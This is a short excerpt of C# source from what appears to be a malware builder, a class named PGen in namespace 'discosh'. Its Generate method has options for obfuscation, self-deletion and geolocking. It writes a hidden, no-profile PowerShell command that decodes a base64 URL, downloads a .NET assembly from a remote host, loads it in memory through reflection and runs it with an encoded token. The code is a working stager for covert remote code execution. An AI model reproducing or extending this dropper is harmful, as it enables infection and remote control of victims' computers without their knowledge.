...
namespace discosh
{
    public class PGen
    {
        ...
        public static byte[] Generate(string token, string prefix, bool obf, bool delself, string geolock, bool ponly)
        {
            ...
            gencode.AppendLine($"powershell -noprofile -windowstyle hidden -command [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData((New-Object System.Net.WebClient).DownloadString([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{(ponly ? payload_uri : dropper_uri)}'))))).EntryPoint.Invoke($null, (, [string[]] ('{Convert.ToBase64String(Encoding.UTF8.GetBytes(token))}', '{prefix}', '{geolock}')))");
